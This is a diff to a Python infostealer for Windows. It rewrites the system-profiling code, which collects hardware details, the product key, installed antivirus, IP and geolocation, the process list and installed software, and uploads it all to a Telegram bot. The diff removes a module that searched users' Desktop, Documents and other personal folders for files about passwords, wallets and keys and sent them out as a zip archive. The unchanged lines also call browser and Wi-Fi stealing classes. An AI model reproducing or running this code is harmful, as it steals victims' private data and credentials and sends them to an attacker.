@@ -11,7 +11,7 @@ import io
 import time
 
 # How to get token and ID: https://www.youtube.com/watch?v=JNwEJ5HvLgM
-bot_token = 'token'
+bot_token = 'TOKEN'
 chat_id = 'ID'
 
 import os
@@ -34,43 +34,54 @@ class PcInfo:
             return "unknown"
 
     def get_all_avs(self) -> str:
-        process = subprocess.run(
-            "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName",
-            shell=True, capture_output=True
-        )
-        if process.returncode == 0:
-            output = process.stdout.decode(errors="ignore").strip().splitlines()
-            if len(output) >= 2:
-                av_list = [av.strip() for av in output[1:] if av.strip()]
-                return ", ".join(av_list)
-        return "No antivirus found"
+        try:
+            process = subprocess.run(
+                "Get-WmiObject -Namespace 'Root\\SecurityCenter2' -Class AntivirusProduct | Select-Object displayName",
+                shell=True, capture_output=True, text=True
+            )
+            if process.returncode == 0:
+                output = process.stdout.strip().splitlines()
+                if len(output) >= 2:
+                    av_list = [av.strip() for av in output[1:] if av.strip()]
+                    return ", ".join(av_list)
+            return "No antivirus found"
+        except Exception as e:
+            print(f"Error getting antivirus: {e}")
+            return "Error retrieving antivirus information"
 
     def get_screen_resolution(self):
-        monitors = get_monitors()
-        resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
-        return ', '.join(resolutions) if resolutions else "Unknown"
+        try:
+            monitors = get_monitors()
+            resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
+            return ', '.join(resolutions) if resolutions else "Unknown"
+        except Exception as e:
+            print(f"Error getting screen resolution: {e}")
+            return "Unknown"
 
     def get_system_info(self):
         try:
-            computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
-            cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
-            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
-            ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
-                      shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
-            model = subprocess.run('wmic computersystem get model', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
+            computer_os = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"', capture_output=True, shell=True, text=True)
+            computer_os = computer_os.stdout.strip() if computer_os.returncode == 0 else "Unknown"
+            cpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_Processor).Name"', capture_output=True, shell=True, text=True)
+            cpu = cpu.stdout.strip() if cpu.returncode == 0 else "Unknown"
+            gpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_VideoController).Name"', capture_output=True, shell=True, text=True)
+            gpu = gpu.stdout.strip() if gpu.returncode == 0 else "Unknown"
+            ram = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"', capture_output=True, shell=True, text=True)
+            ram = str(round(int(ram.stdout.strip()) / (1024 ** 3))) if ram.returncode == 0 else "Unknown"
+            model = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"', capture_output=True, shell=True, text=True)
+            model = model.stdout.strip() if model.returncode == 0 else "Unknown"
             username = os.getenv("UserName")
             hostname = os.getenv("COMPUTERNAME")
-            uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-            product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"
-
+            uuid = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"', capture_output=True, shell=True, text=True)
+            uuid = uuid.stdout.strip() if uuid.returncode == 0 else "Unknown"
+            product_key = subprocess.run('powershell -Command "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"', capture_output=True, shell=True, text=True)
+            product_key = product_key.stdout.strip() if product_key.returncode == 0 and product_key.stdout.strip() != "" else "Failed to get product key"
             r = requests.get("http://ip-api.com/json/?fields=225545").json()
             country = r.get("country", "Unknown")
             proxy = r.get("proxy", False)
             ip = r.get("query", "Unknown")
-                  
             _, addrs = next(iter(psutil.net_if_addrs().items()))
             mac = addrs[0].address
-
             screen_resolution = self.get_screen_resolution()
 
             message = f'''
@@ -88,8 +99,8 @@ class PcInfo:
 **CPU:** `{cpu}`
 **GPU:** `{gpu}`
 **RAM:** `{ram}GB`\n
-**Antivirus:** `{self.get_all_avs()}`
-            '''
+**Antivirus:** `{self.get_all_avs()}`'''
+
             tasklist = subprocess.run("tasklist", capture_output=True, shell=True, text=True)
             tasklist_output = tasklist.stdout.strip()
 
@@ -102,16 +113,14 @@ class PcInfo:
                 f.write(tasklist_output)
                 f.write("\n\nDanh sách phần mềm đã cài đặt:\n")
                 f.write(installed_apps_output)
-
             self.send_message_to_telegram(message)
-            
             self.send_file_to_telegram(log_file)
-
             os.remove(log_file)
             print(f"Tệp {log_file} đã được xóa.")
-        
+
         except Exception as e:
             self.send_message_to_telegram(f"Error occurred: {str(e)}")
+            print(f"Error occurred: {str(e)}")
 
     def send_message_to_telegram(self, message: str):
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
@@ -158,6 +167,7 @@ class PcInfo:
                 else:
                     print("Đã thử tối đa. Không thể gửi tệp.")
         return None
+
 
 class Browser:
     def __init__(self):
@@ -712,107 +722,11 @@ class Wifi:
                     print("Maximum retries reached. Could not send message.")
         return None
 
-    
-import os
-import zipfile
-import requests
-import winreg
-import time
-from concurrent.futures import ThreadPoolExecutor
-
-temp_path = os.path.join(os.getenv('TEMP', '/tmp'), 'common_files_temp') 
-
-class CommonFiles:
-    def __init__(self):
-        self.zipfile = os.path.join(temp_path, 'Common-Files.zip')
-        self.files_to_zip = []
-        self.steal_common_files()
-        self.create_zip()
-        self.send_to_telegram()
-
-    def steal_common_files(self) -> None:
-        def _get_user_folder_path(folder_name):
-            try:
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as key:
-                    value, _ = winreg.QueryValueEx(key, folder_name)
-                    return value
-            except FileNotFoundError:
-                return None
-
-        personal_folders = [
-            "Desktop", "Personal", "Downloads", "My Pictures", "My Music", "My Videos", "Documents"
-        ]
-        
-        paths = [_get_user_folder_path(folder) for folder in personal_folders]
-
-        if not os.path.exists(temp_path):
-            os.makedirs(temp_path)
-
-        with ThreadPoolExecutor() as executor:
-            executor.map(self._process_directory, filter(lambda p: p and os.path.isdir(p), paths))
-
-    def _process_directory(self, directory):
-        try:
-            with os.scandir(directory) as entries:
-                for entry in entries:
-                    if entry.is_file():
-                        if (any(x in entry.name.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")) 
-                            or entry.name.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ods", ".json", ".ppk", ".jpg", ".jpeg", ".png", ".gif"))) \
-                            and not entry.name.endswith(".lnk") \
-                            and 0 < entry.stat().st_size < 48 * 1024 * 1024: 
-                            self.files_to_zip.append(entry.path)
-                    elif entry.is_dir():
-                        self._process_directory(entry.path)
-        except PermissionError:
-            pass
-
-    def create_zip(self):
-        with zipfile.ZipFile(self.zipfile, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for file in self.files_to_zip:
-                try:
-                    if os.path.exists(file) and os.access(file, os.R_OK):
-                        zipf.write(file, os.path.relpath(file, start=temp_path)) 
-                    else:
-                        print(f"Skipping inaccessible file: {file}")
-                except OSError as e:
-                    print(f"Error adding file {file} to zip: {e}")
-
-    def send_file_to_telegram(self, file_path: str):
-        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-        retries = 3  
-        for attempt in range(retries):
-            try:
-                with open(file_path, 'rb') as file:
-                    response = requests.post(
-                        url,
-                        files={'document': file},
-                        data={'chat_id': chat_id}
-                    )
-                if response.status_code == 200:
-                    print("File sent successfully")
-                    return response
-                else:
-                    print(f"Failed to send file. Status code: {response.status_code}")
-            except requests.exceptions.RequestException as e:
-                print(f"Attempt {attempt + 1} failed: {e}")
-                if attempt < retries - 1:
-                    time.sleep(5) 
-                else:
-                    print("Maximum retries reached. Could not send file.")
-        return None
-
-    def send_to_telegram(self):
-        if os.path.exists(self.zipfile):
-            self.send_file_to_telegram(self.zipfile)
-        else:
-            print("Zip file does not exist.")
-
 def main():
-    PcInfo() 
+    PcInfo()
     Browser()
     Browsers() 
-    Wifi() 
-    CommonFiles()  
+    Wifi()  
 
 if __name__ == "__main__":
     main()
